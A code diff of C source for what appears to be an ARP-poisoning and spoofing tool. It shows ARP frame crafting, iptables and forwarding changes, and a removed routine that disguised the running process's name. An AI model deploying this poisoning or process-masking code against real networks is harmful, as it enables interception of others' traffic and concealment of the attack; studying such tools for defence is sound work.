@@ -10,17 +10,16 @@ pthread_t thread_id;
 int main(int argc, char *argv[]) {
     char errbuf[PCAP_ERRBUF_SIZE] = {0};
     u_char* args = NULL;
-
-
-    struct bpf_program fp;      // holds compiled program
-    bpf_u_int32 netp;           // ip
+    struct bpf_program fp;
+    bpf_u_int32 netp;
     bpf_u_int32 maskp;
+
 
     check_root_user();
     signal(SIGINT,sig_handler);
     options_spoofing_init(&opts);
 
-    program_setup(argc, argv);              // set process name, get root privilege
+    program_setup();
     nic_device = pcap_lookupdev(errbuf);    // get interface
     pcap_lookupnet(nic_device, &netp, &maskp, errbuf);
 
@@ -29,7 +28,7 @@ int main(int argc, char *argv[]) {
     get_MAC_address();
     get_url_address();
     get_gateway_ip_address();
-    get_ip_address();   // Returning IP address
+    get_ip_address();
     get_device_ip(nic_device);
     set_iptables_rule();
 
@@ -77,11 +76,7 @@ void options_spoofing_init(struct options_spoofing* option) {
 }
 
 
-void program_setup(int argc, char *argv[]) {
-    memset(argv[0], 0, strlen(argv[0]));
-    strcpy(argv[0], MASK);
-    prctl(PR_SET_NAME, MASK, 0, 0);
-
+void program_setup(void) {
     /* Flush caches that has website already visited */
     system(FLUSH_CASH1);
     system(FLUSH_CASH2);
@@ -179,13 +174,10 @@ void get_device_ip(char* nic_device) {
     struct ifreq ifr;
 
     n = socket(AF_INET, SOCK_DGRAM, 0);
-    //Type of address to retrieve - IPv4 IP address
     ifr.ifr_addr.sa_family = AF_INET;
-    //Copy the interface name in the ifreq structure
     strncpy(ifr.ifr_name, nic_device, IFNAMSIZ - 1);
     ioctl(n, SIOCGIFADDR, &ifr);
     close(n);
-    //display result
     strcpy(opts.device_ip, inet_ntoa(((struct sockaddr_in *) &ifr.ifr_addr)->sin_addr));
 }
 
@@ -200,17 +192,16 @@ bool is_valid_ipaddress(char *ip_address) {
 
 
 void sig_handler(int signum) {
-    //Return type of the handler function should be void
     char cmd[64] = {0};
     pid = getpid();
 
     system(FORWARD_0);
     system(IPT_FLUSH);
+
     printf("Ctrl + C pressed\n Exit program \n");
     sprintf(cmd, "sudo kill -9 %d", pid);
     kill(pid,SIGUSR1);
 
-    // extra kill for sometimes not successfully killed
     system(cmd);
 }
 
@@ -222,7 +213,12 @@ void get_MAC_address() {
     int success = 0;
 
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
-    if (sock == -1) { /* handle error*/ };
+    if (sock == -1) {
+        if (sock == -1) {
+            perror("socket");
+            exit(1);
+        }
+    }
 
     ifc.ifc_len = sizeof(buf);
     ifc.ifc_buf = buf;
@@ -234,7 +230,7 @@ void get_MAC_address() {
     for (; it != end; ++it) {
         strcpy(ifr.ifr_name, it->ifr_name);
         if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
-            if (!(ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
+            if (!(ifr.ifr_flags & IFF_LOOPBACK)) {
                 if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                     success = 1;
                     break;
@@ -291,7 +287,7 @@ void* arp_poisoning() {
         exit(1);
     }
 
-    memcpy(eth->ether_dhost, opts.target_MAC, ETH_ALEN);//bcast
+    memcpy(eth->ether_dhost, opts.target_MAC, ETH_ALEN);
     memcpy(eth->ether_shost, opts.device_MAC, ETH_ALEN);
     eth->ether_type = htons(ETH_P_ARP);
 
